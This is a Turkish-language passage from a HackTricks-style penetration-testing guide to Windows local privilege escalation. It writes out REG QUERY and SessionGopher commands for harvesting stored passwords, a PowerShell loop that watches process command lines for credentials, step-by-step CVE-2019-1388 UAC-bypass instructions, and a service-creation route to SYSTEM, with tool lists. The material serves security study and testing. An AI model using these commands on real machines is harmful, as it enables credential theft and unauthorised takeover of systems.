Windows işletim sisteminde, kullanıcıların parolaları ve diğer hassas bilgileri kaydetmek için kayıt defteri sıklıkla kullanılır. Bu nedenle, bir saldırganın yerel bir ayrıcalık yükseltme saldırısı sırasında kayıt defterindeki anahtar adlarını ve parolaları araması önemlidir.

Aşağıdaki adımları izleyerek kayıt defterinde anahtar adlarını ve parolaları arayabilirsiniz:

1. Başlat menüsünden "regedit" yazarak Kayıt Defteri Düzenleyicisi'ni açın.
2. Kayıt Defteri Düzenleyicisi'nde, "HKEY_LOCAL_MACHINE" anahtarını genişletin.
3. Ardından, "SOFTWARE" anahtarını genişletin.
4. "Microsoft" anahtarını genişletin.
5. "Windows NT" anahtarını genişletin.
6. "CurrentVersion" anahtarını genişletin.
7. "Winlogon" anahtarını genişletin.
8. "DefaultUserName" ve "DefaultPassword" değerlerini kontrol edin. Bu değerler, oturum açma ekranında varsayılan olarak kullanılan kullanıcı adı ve parolayı içerir.
9. Ayrıca, "AutoAdminLogon" değerini kontrol edin. Bu değer "1" olarak ayarlandığında, oturum açma ekranı atlanır ve oturum açma işlemi otomatik olarak gerçekleştirilir.

Kayıt defterindeki anahtar adları ve parolaları aramak, yerel bir ayrıcalık yükseltme saldırısı sırasında kullanışlı olabilir. Ancak, bu işlemi yasal ve etik sınırlar içinde gerçekleştirmek önemlidir.
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parolaları arayan araçlar

[**MSF-Credentials Eklentisi**](https://github.com/carlospolop/MSF-Credentials) **bir msf** eklentisidir. Bu eklentiyi, kurbanın içinde kimlik bilgilerini arayan her metasploit POST modülünü otomatik olarak çalıştırmak için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada belirtilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) sistemden parola çıkarmak için harika bir başka araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, bu verileri açık metin olarak kaydeden çeşitli araçların (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP) oturumları, kullanıcı adları ve parolaları arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Sızdırılan İşleyiciler

**SİSTEM olarak çalışan bir işlem**, `OpenProcess()` ile **tam erişim** ile **yeni bir işlem açar**. Aynı işlem, **düşük ayrıcalıklara sahip yeni bir işlem** (`CreateProcess()`) **oluştururken ana işlemin tüm açık işleyicilerini devralır**.\
Ardından, **düşük ayrıcalıklı işleme tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan **açık işleyiciyi yakalayabilir** ve bir shellcode enjekte edebilirsiniz.\
[Bu örneği okuyarak bu güvenlik açığını **nasıl tespit edip istismar edeceğiniz** hakkında daha fazla bilgi edinin.](leaked-handle-exploitation.md)\
[Farklı ayrıcalık seviyeleriyle devralınan işlemler ve iş parçacıklarının daha fazla açık işleyicisini nasıl test edip istismar edeceğiniz hakkında daha kapsamlı bir açıklama için bu **diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## İsimlendirilmiş Pipe İstemci Taklit Etme

Paylaşılan bellek segmentleri, **pipe** olarak adlandırılan işlem iletişimini ve veri transferini sağlar.

Windows, farklı ağlar üzerinden bile ilişkisiz işlemlerin veri paylaşmasını sağlayan **İsimlendirilmiş Pipe** adlı bir özellik sunar. Bu, **isimlendirilmiş pipe sunucusu** ve **isimlendirilmiş pipe istemcisi** olarak tanımlanan rolleri olan bir istemci/sunucu mimarisine benzer.

Bir **istemci** tarafından bir pipe üzerinden gönderilen veriler, pipe'ı kuran **sunucunun**, gerekli **SeImpersonate** haklarına sahipse, **istemcinin kimliğini alabilme** yeteneğine sahiptir. İletişim kurduğunuz pipe üzerinden etkileşimde bulunduğunda, taklit edebileceğiniz bir **ayrıcalıklı işlem** tespit etmek, o işlemle aynı kimliği alarak **daha yüksek ayrıcalıklar elde etme** fırsatı sunar. Bu tür bir saldırıyı gerçekleştirmek için talimatlar için yardımcı kılavuzlar [**burada**](named-pipe-client-impersonation.md) ve [**burada**](./#from-high-integrity-to-system) bulunabilir.

Ayrıca, aşağıdaki araç, bir named pipe iletişimini **burp gibi bir araçla dinlemek için kullanılabilir:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, tüm pipe'ları listelemenize ve ayrıcalık yükseltme fırsatlarını bulmanıza olanak sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Çeşitli

### **Parolaları İzlemek için Komut Satırlarını İzleme**

Bir kullanıcı olarak bir kabuk elde ettiğinizde, komut satırında **kimlik bilgilerini geçiren zamanlanmış görevler veya diğer işlemler olabilir**. Aşağıdaki betik, işlem komut satırlarını her iki saniyede bir yakalar ve mevcut durumu önceki durumla karşılaştırarak herhangi bir farkı çıktılar.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Düşük Ayrıcalıklı Kullanıcıdan NT\AUTHORITY SYSTEM'e Geçiş (CVE-2019-1388) / UAC Atlama

Eğer grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan "NT\AUTHORITY SYSTEM" gibi bir terminal veya başka bir işlemi çalıştırmak mümkündür.

Bu, ayrıcalıkları yükseltmeyi ve aynı zamanda UAC'yi atlama yeteneğini aynı zafiyetle gerçekleştirmeyi mümkün kılar. Ek olarak, herhangi bir şey kurmanıza gerek yoktur ve işlem sırasında kullanılan ikili, Microsoft tarafından imzalanmış ve yayınlanmıştır.

Etkilenen sistemlerin bazıları aşağıdaki gibidir:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu zafiyeti sömürmek için aşağıdaki adımları gerçekleştirmek gerekmektedir:

```
1) HHUPD.EXE dosyasına sağ tıklayın ve Yönetici olarak çalıştır seçeneğini seçin.

2) UAC uyarısı göründüğünde, "Daha fazla ayrıntı göster" seçeneğini seçin.

3) "Yayıncı sertifika bilgilerini göster" seçeneğine tıklayın.

4) Sistem savunmasızsa, "Veren" URL bağlantısına tıklandığında varsayılan web tarayıcısı görünebilir.

5) Site tamamen yüklenene kadar bekleyin ve "Farklı kaydet" seçeneğini seçerek bir explorer.exe penceresi açın.

6) Explorer penceresinin adres yoluna cmd.exe, powershell.exe veya başka bir etkileşimli işlem girin.

7) Artık "NT\AUTHORITY SYSTEM" komut istemine sahip olacaksınız.

8) Masaüstünüze dönmek için kurulumu ve UAC uyarısını iptal etmeyi unutmayın.
```

Gerekli tüm dosya ve bilgilere aşağıdaki GitHub deposunda sahipsiniz:

https://github.com/jas502n/CVE-2019-1388

## Yönetici Orta'dan Yüksek Bütünlük Seviyesine / UAC Atlatma

**Bütünlük Seviyeleri** hakkında bilgi edinmek için bunu **okuyun**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Ardından **UAC ve UAC atlatmaları hakkında bilgi edinmek için bunu okuyun**:

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **Yüksek Bütünlükten Sistem'e**

### **Yeni servis**

Eğer zaten Yüksek Bütünlük seviyesinde bir işlem çalıştırıyorsanız, **SİSTEM'e geçmek** kolay olabilir, sadece **yeni bir servis oluşturup çalıştırarak**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Yüksek bütünlük sürecinden, **AlwaysInstallElevated kayıt defteri girişlerini etkinleştirmeyi** ve bir _**.msi**_ sarmalayıcı kullanarak ters kabuk **yüklemeyi deneyebilirsiniz**.\
[Daha fazla bilgi için ilgili kayıt defteri anahtarları ve bir _.msi_ paketi nasıl yükleneceği hakkında buraya bakabilirsiniz.](./#alwaysinstallelevated)

### High + SeImpersonate yetkisi ile System'e

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'den Full Token yetkilerine

Bu token yetkilerine sahipseniz (bunları genellikle zaten Yüksek Bütünlük sürecinde bulabilirsiniz), SeDebug yetkisiyle **nearly any process**'i (korunan olmayan süreçler hariç) **açabilir**, sürecin **token'ını kopyalayabilir** ve o token ile **keyfi bir süreç oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token yetkilerine sahip SYSTEM olarak çalışan bir süreç seçilir** (_evet, tüm token yetkilerine sahip olmayan SYSTEM süreçleri bulabilirsiniz_).\
**Önerilen teknikle ilgili bir kod örneği** [**burada bulunabilir**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Adlandırılmış Borular (Named Pipes)**

Bu teknik, meterpreter'ın `getsystem` ayrıcalığında yükselmesi için kullanılır. Teknik, bir boru oluşturmak ve ardından o boruya yazmak için bir hizmet oluşturmak/istismar etmekten oluşur. Ardından, boru istemcisinin (hizmetin) token'ını taklit edebilen boruyu oluşturan sunucu, SYSTEM ayrıcalıklarını elde edebilir.\
[**Adlandırılmış borular hakkında daha fazla bilgi edinmek için burayı okumalısınız**](./#named-pipe-client-impersonation).\
[**Yüksek bütünlükten System'e adlandırılmış borular kullanarak nasıl geçileceğine dair bir örnek okumak için burayı okumalısınız**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer **SYSTEM** olarak çalışan bir **süreç** tarafından **yüklenen bir dll'yi ele geçirebilirseniz**, bu izinlerle keyfi kodu yürütebilirsiniz. Bu nedenle Dll Hijacking, bu tür bir ayrıcalık yükseltmesi için de kullanışlıdır ve üstelik **yüksek bütünlük sürecinden çok daha kolay bir şekilde elde edilebilir**, çünkü dll'leri yüklemek için kullanılan klasörlerde **yazma izinleri** olacaktır.\
[**Dll hijacking hakkında daha fazla bilgi edinmek için burayı okuyabilirsiniz**](dll-hijacking.md)**.**

### **Yönetici veya Network Service'den System'e**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICE veya NETWORK SERVICE'den tam ayrıcalıklara

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Statik impacket ikili dosyaları](https://github.com/ropnop/impacket\_static\_binaries)

## Faydalı araçlar

**Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol edin (**[**buraya bakın**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Algılandı.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol edin ve bilgi toplayın (**[**buraya bakın**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol edin**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiş oturum bilgilerini çıkarır. Yerelde -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Kimlik Bilgilerini Kimlik Yöneticisinden çıkarır. Algılandı.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları etki alanına yayınlayın**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell ADIDNS/LLMNR/mDNS/NBNS sahtekarlığı ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel ayrıcalık yükseltme Windows taraması**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Bilinen ayrıcalık yükseltme zafiyetlerini arayın (Watson için KALDIRILDI)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Yönetici hakları gerektirir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen ayrıcalık yükseltme zafiyetlerini arayın (VisualStudio kullanılarak derlenmesi gerekmektedir) ([**derlenmiş hali**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayan bir araçtır (daha çok bilgi toplama aracıdır) (derlenmesi gerekmektedir) **(**[**derlenmiş hali**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da derlenmiş exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Yanlış yapılandırmaları kontrol eder (github'da derlenmiş yürütülebilir). Tavsiye edilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Tavsiye edilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulan bir araçtır (düzgün çalışması için accesschk'ye ihtiyaç duymaz, ancak kullanabilir).

**Yerel**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan zafiyetleri önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan zafiyetleri önerir (yerel python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Kurban makinede doğru .NET sürümünü kullanarak projeyi derlemeniz gerekmektedir ([buraya bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban makinede yüklü olan .NET sürümünü görmek
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Kaynakça

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **göndererek paylaşın**.

</details>
